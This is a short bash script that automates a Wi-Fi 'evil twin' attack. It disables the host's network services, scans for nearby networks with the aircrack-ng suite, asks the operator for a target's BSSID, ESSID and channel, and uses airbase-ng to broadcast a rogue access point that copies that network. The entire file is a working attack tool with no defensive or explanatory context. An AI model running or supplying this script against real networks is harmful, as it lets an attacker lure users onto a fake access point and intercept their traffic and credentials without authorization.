#! /bin/bash
Interface=$1
systemctl stop NetworkManager.service
killall wpa_supplicant
airmon-ng start $Interface
airodump-ng $Interface"mon"
echo "Please choose targets BSSID: "
read BSSID
echo "Please choose targets ESSID: "
read ESSID
echo "Please choose targets Channel: "
read Channel
airbase-ng -a $BSSID --essid $ESSID -c $Channel $Interface"mon"
airmon-ng stop $Interface"mon"
systemctl start NetworkManager.service
echo "Ready."
